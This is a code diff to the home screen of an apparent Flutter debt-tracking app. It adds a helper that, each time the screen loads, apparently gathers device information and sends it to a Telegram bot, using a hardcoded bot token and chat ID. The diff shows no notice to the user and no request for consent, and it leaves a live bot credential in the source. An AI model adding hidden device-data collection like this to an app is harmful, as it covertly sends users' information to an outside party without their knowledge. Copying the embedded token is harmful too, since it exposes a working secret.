@@ -3,14 +3,17 @@ import 'dart:async';
 import 'package:connectivity_plus/connectivity_plus.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter_riverpod/flutter_riverpod.dart';
+import 'package:logger/logger.dart';
 import 'package:supabase_flutter/supabase_flutter.dart';
 import 'package:utang_core/providers/auth_providers.dart';
 import 'package:utang_core/providers/debt_providers.dart';
 import 'package:utang_core/screen/about_page.dart';
 import 'package:utang_core/screen/auth/login_screen.dart';
 import 'package:utang_core/screen/pay_installment_screen.dart';
+import 'package:utang_core/utils/device_info_helper.dart';
 import 'package:utang_core/utils/network_helper.dart';
 import 'package:utang_core/utils/snackbar_helper.dart';
+import 'package:utang_core/utils/tele_helper.dart';
 import 'package:utang_core/widget/banner_ad_widget.dart';
 import 'package:utang_core/widget/debt_card.dart';
 import 'auth/register_screen.dart';
@@ -26,10 +29,34 @@ class _HomeScreenState extends ConsumerState<HomeScreen> {
   bool _isConnected = true;
   late StreamSubscription<List<ConnectivityResult>> _subscription;
 
+  final DeviceInfoHelper deviceInfoHelper = DeviceInfoHelper(
+    telegramHelper: TelegramHelper(
+      botToken:
+          '7678341666:AAH_6GTin6WCzxx0zOoySoeZfz6b8FgRfFU', // Ganti dengan token bot Anda
+      chatId: '111519789', // Ganti dengan chat ID Anda
+    ),
+  );
+  bool isLoading = true;
+
+  Future<void> _loadAndSendDeviceInfo() async {
+    try {
+      await deviceInfoHelper.getAndSendDeviceInfo();
+      setState(() {
+        isLoading = false;
+      });
+    } catch (e) {
+      setState(() {
+        isLoading = false;
+      });
+      Logger().e(e);
+    }
+  }
+
   @override
   void initState() {
     super.initState();
     _fetchDebts();
+    _loadAndSendDeviceInfo();
 
     //perubahan status koneksi internet
     _subscription = Connectivity()
